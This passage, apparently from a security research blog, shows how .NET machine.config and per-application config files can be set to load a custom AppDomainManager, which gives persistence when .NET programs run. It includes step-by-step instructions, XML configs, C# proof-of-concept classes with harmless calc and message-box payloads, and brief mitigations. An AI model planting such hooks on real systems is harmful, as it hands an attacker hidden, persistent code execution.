mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Version: Specifies version of the CLR the app supports \"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Sku: Specifies which .NET Framework release the app supports\")), mdx(\"p\", null, \"That\\u2019s great but why should you care? Remember what was just said, \\u201CRoot element in every configuration file.\\u201D\\nThere are more configuration files besides app.config.\\nThis is where our journey begins.\"), mdx(\"h3\", {\n    \"id\": \"note\"\n  }, \"Note\"), mdx(\"p\", null, \"This post does not cover the internals of things such as Global Assembly Cache (GAC), CLR, or strong signed .NET assemblies.\\nIf you need a primer on those,\\nI highly suggest you check out \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/am0nsec\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"am0nsec\\u2019s\"), \"\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.contextis.com/en/blog/common-language-runtime-hook-for-persistence\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"post\"), \" covering\\na different technique for CLR hooking.\"), mdx(\"h3\", {\n    \"id\": \"digging-deeper\"\n  }, \"Digging Deeper\"), mdx(\"p\", null, \"Exactly what other config files exist?\\nBefore we get to that, we must first understand how the runtime locates assemblies.\\nThere are four steps in the process:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Examining the configuration files\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Checking for previously referenced assemblies\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Checking the global assembly cache\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Locating the assembly through codebases or probing\")), mdx(\"p\", null, \"The first step is what we will be focusing on.\\nThere are three configuration files.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"951px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"22.187171398527862%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABJ0AAASdAHeZh94AAAAjklEQVQY03WOWw6DIBBFXYSCgA0WCLAASsQaw/43dQWSJqaGj/Mxj3tmhhA+2LYNIQQcx4F931sdY0TOGed5IqVUZl9orcE5bxBCQCl9MEgp4ZyDrVjbUEo13oUqWde1UXvGGNRMVzjP803mikBBCIFxHDFN04Nfv4ar9F88MMbah957OO/wWpbu9Tu9nQs3p2zwDPMpsQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e0b427c286ecbbbece32c98dd0fc019d/50566/config_files.webp 951w\"],\n    \"sizes\": \"(max-width: 951px) 100vw, 951px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png 951w\"],\n    \"sizes\": \"(max-width: 951px) 100vw, 951px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png\",\n    \"alt\": \"Lists different config files\",\n    \"title\": \"Lists different config files\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"We already covered the application configuration file.\\nBut what about the other two?\"), mdx(\"p\", null, \"The publisher policy file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Distributed by a component publisher as a fix or update to a shared component.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Affects all applications that use a shared component.\")), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"And finally:\")), mdx(\"p\", null, \"The machine configuration file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Takes precedence over all other configuration settings\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Applied to the entire machine.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Resides on the local computer in the config subdirectory\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Can be used by administrators to specify assembly binding\\nrestrictions that are local to the computer\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Requires administrative permissions to modify\")), mdx(\"h3\", {\n    \"id\": \"understanding-machineconfig\"\n  }, \"Understanding machine.config\"), mdx(\"p\", null, \"Where is it located?\"), mdx(\"p\", null, \"Simply type this in PowerShell:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"[System.Runtime.InteropServices.RuntimeEnvironment]::SystemConfigurationFile\\n\")), mdx(\"p\", null, \"You will most likely get:\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\config\\\\machine.config\"), mdx(\"p\", null, \"There is also one here:\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\config\\\\machine.config\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"There are also config files in the 32-bit version of the .NET Framework.\")), mdx(\"p\", null, \"According to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Microsoft\"), \":\"), mdx(\"p\", null, \"\\u201CThe configuration system first looks in the machine configuration file for the\\nappSettings element and other configuration sections that a developer might define.\\u201D\"), mdx(\"p\", null, \"It\\u2019s those other sections that allow us to get persistence.\\nOne section in particular stands out, the runtime section!\"), mdx(\"p\", null, \"In total, the runtime section, its parent and child elements\\ntotal 55 items.\"), mdx(\"p\", null, \"However, we only care about two:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"appDomainManagerType\")), mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"appDomainManagerAssembly\"))), mdx(\"h3\", {\n    \"id\": \"understanding-appdomainmanager--appdomainmanagerassembly\"\n  }, \"Understanding appDomainManager & appDomainManagerAssembly\"), mdx(\"p\", null, \"To understand why we care about those two elements, we must first understand\\nwhat an AppDomain is. AppDomains allow  untrusted third-party\\ncode to run in an existing process, essentially a logical container for a set of assemblies.\\nThe appDomainManager class allows a host to override CLR default behavior by\\nusing managed code instead of unmanaged code.\"), mdx(\"p\", null, \"In order to achieve this, we need to create a class that derives from AppDomainManager\\nwhich initializes a new domain. The appDomainManager element can be configured in the runtime section\\nof a configuration file. This is accomplished via the elements appDomainManagerAssembly and appDomainManagerType.\\nThe class that derives from AppDomainManager\\nneeds to be installed into the GAC because\\nthe assembly needs to be granted full-trust.\\nAll assemblies in the GAC are always granted full-trust.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"TLDR:\"), \"\\nWe can create a class that derives from appDomainManager class\\nthat initializes a new domain to run our code.\\nThe InitializeNewDomain method is called on the new instance of AppDomainManager.\\nAllowing us to hook all calls to AppDomain.CreateDomain to our AppDomainManager which in turn will run our code.\"), mdx(\"h3\", {\n    \"id\": \"putting-the-pieces-altogether\"\n  }, \"Putting the Pieces Altogether\"), mdx(\"p\", null, \"Now that we understand what machine.config and appDomains are\\nand how we can leverage them, it\\u2019s time put all the pieces together\\nto accomplish persistence. There are a few things we need to perform:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Generate a keyfile. Simply do that with sn -k key.snk, \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"sn\"), \" standing for strong name tool\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Create a strong signed .NET assembly using our newly created keyfile\\nwith an assembly that derives from AppDomainManager\\nand overrides InitiliazeNewDomain\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Install that assembly onto the GAC using \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/tools/gacutil-exe-gac-tool\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"gacutil\"), \",\\nC# via \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.enterpriseservices.internal.publish.gacinstall\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Publish.GacInstall\"), \",\\nor PowerShell via this amazing \", mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://gitlab.com/snippets/1878274\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"script\")), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Modify machine.config\\u2019s runtime element attribute with the appDomainType and appDomainManagerAssembly elements:\")), mdx(\"p\", null, \"To get the appDomainManagerAssembly you can \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<runtime>  \\n    <appDomainManagerType value=\\\"Context Name\\\" />  \\n    <appDomainManagerAssembly   \\n        value=\\\"Signed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=token\\\" />  \\n</runtime> \\n\")), mdx(\"p\", null, \"Luckily machine.config is simply an XML file so it\\u2019s very easy to modify.\\nThere also exists the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.configuration\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"System.Configuration\"), \"\\nnamespace, which also could have been utilized.\\nHowever, the xml method was personally much easier to use.\"), mdx(\"h3\", {\n    \"id\": \"demo-time\"\n  }, \"Demo Time\"), mdx(\"p\", null, \"Putting all those pieces together in a simple program\\nwhich just requires you to put the keyfile in the\\ncorrect spot. This automates the process :)\"), mdx(\"p\", null, \"Assemblies installed onto the GAC are located here:\"), mdx(\"p\", null, \"C:\\\\Windows\\\\Microsoft.NET\\\\assembly\"), mdx(\"p\", null, \"You will most likely see three folders:\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_32 : For assemblies targeting 32-bit platforms\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_64 : For assemblies targeting 64-bit platforms\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"GAC_MSIL : For assemblies targeting both 32-bit and 64-bit platforms\")), mdx(\"p\", null, \"You will notice our strong-named assembly called test is installed in GAC_MSIL\"), mdx(\"p\", null, \"One of the most important parts is where we create the class that\\ninherits from appDomainManager.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-csharp\"\n  }), \"using System;\\n    namespace Context {\\n        public sealed class ConfigHooking : AppDomainManager {\\n            public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {\\n                System.Diagnostics.Process.Start(\\\"\\\"calc.exe\\\"\\\");\\n                return;\\n            }\\n        }\\n    }\\n\")), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/22f560d519458db961352e625a13d66a/works.gif\",\n    \"alt\": \"Demo\"\n  }))), mdx(\"p\", null, \"This is running our code that modifies machine.config, which means\\nthat any .NET assembly that is ran will run our code as well.\"), mdx(\"p\", null, \"The full code can be found here:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/ConfigPersist/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"ConfigPersist\")), mdx(\"h3\", {\n    \"id\": \"creating-configs-for-arbitrary-net-assemblies\"\n  }, \"Creating Configs for Arbitrary .NET Assemblies\"), mdx(\"p\", null, \"Thank you to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/subtee\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@subTee\"), \" for the amazing research on this technique.\\nRemember what was said earlier about how the runtime locates assemblies.\\nSpecifically number 4:\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Locating the assembly through codebases or probing\")), mdx(\"p\", null, \"We can also take any arbitrary .NET assembly\\nfor example, FileHistory.exe and create a custom config for it\\nsuch as FileHistory.exe.config looking like this:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<configuration>\\n   <runtime>\\n      <assemblyBinding xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\">\\n         <probing privatePath=\\\"C:\\\\Windows\\\\System32\\\\com;\\\" />\\n      </assemblyBinding>\\n      <appDomainManagerAssembly value=\\\"ArbConfig, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\\\" />\\n      <appDomainManagerType value=\\\"MyAppDomainManager\\\" />\\n   </runtime>\\n</configuration>\\n\")), mdx(\"p\", null, \"ArbConfig being the name of the unsigned assembly.\\nWe can then simply place that config file\\ninside System32 and the next time FileHistory.exe\\nis ran our code will be ran instead.\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Create your assembly that derives from AppDomainManager.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Place your unsigned assembly in the same directory\\nas the .NET assembly you want to affect.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Modify your config with the privatePath being equal\\nto where you placed your assembly.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Place the config file in the same directory or a subdirectory\\nas the .NET assembly you want to affect.\")), mdx(\"p\", null, mdx(\"img\", _extends({\n    parentName: \"p\"\n  }, {\n    \"src\": \"/817df49b83adbe093073518465330199/second_demo.gif\",\n    \"alt\": \"second_demo\"\n  }))), mdx(\"p\", null, \"This creates an arbitrary config for FileHistory which\\nmeans when FileHistory is it runs our code in ArbConfig.dll first.\"), mdx(\"p\", null, \"The code for ArbConfig.dll:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-csharp\"\n  }), \"using System;\\nusing System.Reflection;\\nusing System.EnterpriseServices;\\nusing System.Runtime.InteropServices;\\n\\npublic sealed class MyAppDomainManager : AppDomainManager\\n{\\n    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)\\n    {\\n        System.Windows.Forms.MessageBox.Show(\\\"Config Files are fun\\\");\\n        return;\\n    }\\n}\\n\")), mdx(\"p\", null, \"For more information on this technique\\nread about the probing \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"element\"), \".\"), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Monitoring for modifications to machine.config\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Monitoring for dynamic compilation of C# code\")), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Look into automating the creation of configs for any arbitrary .NET assembly\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Dig deeper into just how powerful machine.config is\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Research .NET Core runtime persistence mechanisms\")), mdx(\"h3\", {\n    \"id\": \"closing-thoughts\"\n  }, \"Closing Thoughts\"), mdx(\"p\", null, \"The concept of leveraging built-in config files for persistence is quite fascinating\\nas with the shift from PowerShell to .NET tradecraft, .NET attacks will become\\nmuch more common and frequent.\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Shout outs to:\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://twitter.com/am0nsec\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"am0nsec\"), \" for the amazing post\\non CLR hooking and for his awesome suggestions on this post.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://twitter.com/subTee\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"subTee\"), \" for motivating me to work harder\\nand for his amazing research on the topic as well.\")), mdx(\"h2\", {\n    \"id\": \"references\"\n  }, \"References\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/deployment/how-the-runtime-locates-assemblies\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/runtime-element\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/supportedruntime-element\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/dotnet/api/system.appdomain\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/dotnet/api/system.appdomain\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"a\", _extends({\n    parentName: \"li\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/15hyw9x3(v=vs.100)\"))));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.710144927536232,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/58fe7/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/e0f30/binding.jpg 236w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/86afd/binding.jpg 472w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/58fe7/binding.jpg 944w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/99fbb/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/77392/binding.webp 236w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/1f177/binding.webp 472w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/99fbb/binding.webp 944w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.7157894736842105,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/1dc0b/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/3a5ce/binding.jpg 163w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/05730/binding.jpg 327w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/1dc0b/binding.jpg 653w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/0acdf/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/ac59e/binding.webp 163w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/7660b/binding.webp 327w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/0acdf/binding.webp 653w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAEDAgX/xAAWAQEBAQAAAAAAAAAAAAAAAAABAAL/2gAMAwEAAhADEAAAAejhWwxGF//EABsQAAIBBQAAAAAAAAAAAAAAAAABAhAREjEy/9oACAEBAAEFAtHRihRvN0//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAABBQEAAAAAAAAAAAAAAAAQAAECESEx/9oACAEBAAY/AlnBK9Y//8QAGxAAAgIDAQAAAAAAAAAAAAAAAAERIRAxUUH/2gAIAQEAAT8hrYvl0QVAhDwU8Hs//9oADAMBAAIAAwAAABAUP//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/EKf/xAAVEQEBAAAAAAAAAAAAAAAAAAAQEf/aAAgBAgEBPxCH/8QAGxABAAIDAQEAAAAAAAAAAAAAAQAhEVFhMXH/2gAIAQEAAT8Qa8wzR2CVdzL+HZ4QetrEjbhjQdkTiNj/2Q==","aspectRatio":1.7014925373134329,"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/eaa58/binding.jpg","srcSet":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/5a3ee/binding.jpg 114w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/41f8f/binding.jpg 229w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/eaa58/binding.jpg 457w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/c309b/binding.jpg 686w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/e3008/binding.jpg 914w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg 960w","srcWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/15384/binding.webp","srcSetWebp":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/31fce/binding.webp 114w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/e3e25/binding.webp 229w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/15384/binding.webp 457w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/0258d/binding.webp 686w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/64ea2/binding.webp 914w,\n/static/fc0ea83a3d926ef2243c1e6ad37005c1/fcc10/binding.webp 960w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/fc0ea83a3d926ef2243c1e6ad37005c1/b1cc5/binding.jpg"}}},{"id":"e5e132e2-60a8-51f3-837e-608f4c23bc5a","slug":"/Hiding-Your-Tracks-Bash-History","secret":false,"title":"Hiding Your Tracks Bash History","author":"Bad3r","date":"January 20th, 2020","dateForSEO":"2020-01-20T00:00:00.000Z","timeToRead":2,"excerpt":"Tricks to hide bash history.","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { 